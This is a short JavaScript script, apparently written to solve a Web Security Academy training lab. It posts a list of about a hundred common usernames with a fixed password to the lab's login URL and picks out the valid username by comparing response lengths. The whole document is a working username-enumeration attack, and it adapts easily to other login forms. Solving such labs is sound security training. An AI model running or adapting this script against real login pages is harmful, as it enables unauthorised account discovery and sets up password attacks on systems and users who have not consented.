const usernames = [
    "root",
    "admin",
    "test",
    "guest",
    "info",
    "adm",
    "mysql",
    "user",
    "administrator",
    "oracle",
    "ftp",
    "pi",
    "puppet",
    "ansible",
    "ec2-user",
    "vagrant",
    "azureuser",
    "academico",
    "acceso",
    "access",
    "accounting",
    "accounts",
    "acid",
    "activestat",
    "ad",
    "adam",
    "adkit",
    "admin",
    "administracion",
    "administrador",
    "administrator",
    "administrators",
    "admins",
    "ads",
    "adserver",
    "adsl",
    "ae",
    "af",
    "affiliate",
    "affiliates",
    "afiliados",
    "ag",
    "agenda",
    "agent",
    "ai",
    "aix",
    "ajax",
    "ak",
    "akamai",
    "al",
    "alabama",
    "alaska",
    "albuquerque",
    "alerts",
    "alpha",
    "alterwind",
    "am",
    "amarillo",
    "americas",
    "an",
    "anaheim",
    "analyzer",
    "announce",
    "announcements",
    "antivirus",
    "ao",
    "ap",
    "apache",
    "apollo",
    "app",
    "app01",
    "app1",
    "apple",
    "application",
    "applications",
    "apps",
    "appserver",
    "aq",
    "ar",
    "archie",
    "arcsight",
    "argentina",
    "arizona",
    "arkansas",
    "arlington",
    "as",
    "as400",
    "asia",
    "asterix",
    "at",
    "athena",
    "atlanta",
    "atlas",
    "att",
    "au",
    "auction",
    "austin",
    "auth",
    "auto",
    "autodiscover"
]

let formData = new FormData()
formData.set("password", "attack")

const url = "https://acf61fee1f57b7ff80209da7002c0040.web-security-academy.net/login"

let resLength = []

for(let i = 0; i < usernames.length; i++) {
    const username = usernames[i];
    formData.set("username", username)
    resLength.push(
        fetch(url, {
            method: 'POST',
            body: formData
        })
        .then(res => res.text())
        .then(res => res.length)            
    )
}

resLength = await Promise.all(resLength)

function filterUnique(value, index, self) {
  return self.indexOf(value) === index;
}

uniqueLens = resLength.filter(filterUnique)
maxLen = Math.max(...uniqueLens)

console.log("Correct username: " + usernames[resLength.indexOf(maxLen)])
